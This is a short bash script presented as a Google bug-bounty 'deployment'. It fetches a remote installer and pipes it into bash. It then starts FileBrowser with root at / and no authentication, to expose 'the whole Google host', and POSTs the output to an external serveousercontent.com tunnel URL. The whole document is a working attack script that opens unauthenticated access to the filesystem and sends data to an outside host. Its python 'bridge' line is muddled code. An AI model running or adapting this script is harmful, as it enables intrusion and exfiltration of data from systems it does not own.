#!/bin/bash
# TARGET: https://97ab4b9024fcd239-103-95-173-85.serveousercontent.com
URL="https://97ab4b9024fcd239-103-95-173-85.serveousercontent.com"

{
  echo "=== [!] GOOGLE VRP: DEPLOYING FILE-MGMT INTERFACE ==="

  # 1. Download the static binary (fast and lightweight)
  curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash
  
  # 2. Launch FileBrowser on port 9001
  # We point the "root" to / so you can see the whole Google host
  filebrowser -p 9001 -r / --noauth &
  
  sleep 3
  echo "[+] File Manager active at /. Forwarding to Mac..."

  # 3. Use the Python 'Bridge' to pump the Web UI traffic to your Mac
  python3 -c "import socket,sys;s=socket.socket();s.connect(('127.0.0.1',9001));[s.send(sys.stdin.buffer.read())]" 
} | curl -s -X POST --data-binary @- "$URL"
